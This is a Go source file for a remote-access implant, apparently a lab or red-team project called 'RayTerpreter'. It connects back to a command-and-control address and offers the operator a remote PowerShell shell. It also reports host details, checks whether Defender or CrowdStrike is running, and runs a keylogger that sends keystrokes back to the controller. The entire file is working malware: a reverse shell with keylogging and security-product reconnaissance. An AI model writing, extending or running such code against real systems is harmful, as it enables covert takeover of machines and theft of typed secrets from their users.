package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"time"

	"github.com/D3Ext/maldev/process"
	//"github.com/MarinX/keylogger"
	"github.com/eiannone/keyboard"
)

func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
	if *attempts > 3 {
		terminate()
	}
	addr, err := net.Dial("tcp", *c2Address)
	if err != nil {
		fmt.Println("Couldn't establish a connection")
		*attempts = *attempts + 1
		time.Sleep(10 * time.Second)
		return addr, false
	}
	addr.Write([]byte("Success\n"))
	*attempts = 0
	return addr, true
}

func listen4Commands(conn *net.Conn, implantWD *string) string {
	request := make([]byte, 128)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		os.Exit(0)
	}
	if err != nil {
		os.Exit(0)
	}
	command := string(request[:read_len])
	return command
}

func executeCommands(conn *net.Conn, command string) {
	if command == "stop\n" {
		terminate()
	}
	cmd := exec.Command("powershell.exe", "/C", command)
	output, err := cmd.Output()
	if err != nil {
		fmt.Println("Couldn't Exec Command")
	}
	if len(output) < 1 {
		output = []byte("Couldn't execute the command\n")
	}
	(*conn).Write(output)
}

func checkSec() []string {
	products := []string{}
	procs, err := process.GetProcesses()
	if err != nil {
		fmt.Println("Couldn't Get Processes")
	}
	for index := range procs {
		if procs[index].Exe == "MsMpEng.exe" {
			products = append(products, "Defender")
		}
		if procs[index].Exe == "CSFalconService.exe" {
			products = append(products, "CrowdStrike")
		}
	}
	return products
}

func logger(conn *net.Conn) { //This only works within the context of the current window
	buffer := make([]byte, 12)
	if err := keyboard.Open(); err != nil {
		panic(err)
	}
	defer func() {
		_ = keyboard.Close()
	}()
	fmt.Println(len(buffer))
	for i := 0; i < len(buffer); i++ {
		char, _, err := keyboard.GetKey()
		if err != nil {
			panic(err)
		}
		buffer[i] = byte(char)
		//fmt.Printf("You pressed: rune %q", char)
	}
	(*conn).Write([]byte(buffer))
	(*conn).Write([]byte("\n"))
}

func terminate() {
	fmt.Println("Terminating Implant")
	time.Sleep(1 * time.Second)
	os.Exit(0)
}

func listen4Commands2(conn *net.Conn, c1 chan string) {
	request := make([]byte, 32)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		os.Exit(0)
	}
	if err != nil {
		os.Exit(0)
	}
	command := string(request[:read_len])
	c1 <- command
}

func main() {
	c2Address := "192.168.5.138:443"
	attempts := 0
	implantWD, _ := os.Getwd()
	fmt.Println("Implant Started")
	conn, result := callHome(&c2Address, &attempts)
	for !result {
		conn, result = callHome(&c2Address, &attempts)
	}
	for {
		conn.Write([]byte("RayTerpreter $ "))
		command := listen4Commands(&conn, &implantWD)
		switch command {
		case "shell\n":
			{
				for {
					conn.Write([]byte("PS > "))
					command = listen4Commands(&conn, &implantWD)
					if command == "bg\n" {
						break
					}
					executeCommands(&conn, command)
				}
			}
		case "hostinfo\n":
			{
				hostname, _ := os.Hostname()
				home, _ := os.UserHomeDir()
				OperatingSystem := runtime.GOOS
				products := checkSec()
				conn.Write([]byte("\n" + "Hostname: " + hostname + "\n" + "User Dir: " + home + "\n" + "OS: " + OperatingSystem + "\n"))
				productStr := ""
				for i := range products {
					productStr = productStr + products[i] + " "
				}
				if len(products) < 1 {
					products[0] = "No Security Products Present\n"
				}
				conn.Write([]byte("Security: " + productStr + "\n\n"))
			}
		case "logger\n":
			{
				conn.Write([]byte("Send any key besides 'ENTER' to exit the keylogger\n"))
				c1 := make(chan string)
				result := "\n"
				pResult := &result
				for {
					go listen4Commands2(&conn, c1)
					go func() {
						resultC1 := <-c1
						*pResult = resultC1
					}()
					if result != "\n" { //The function doesnt end instantly, it waits the end of the buffer before exiting.
						break
					}
					logger(&conn)
				}
			}
		case "stop\n":
			terminate()
		default:
			conn.Write([]byte("Available Commands: shell, hostinfo, logger, stop\n"))
		}
	}
	//time.Sleep(10 * time.Second)
}
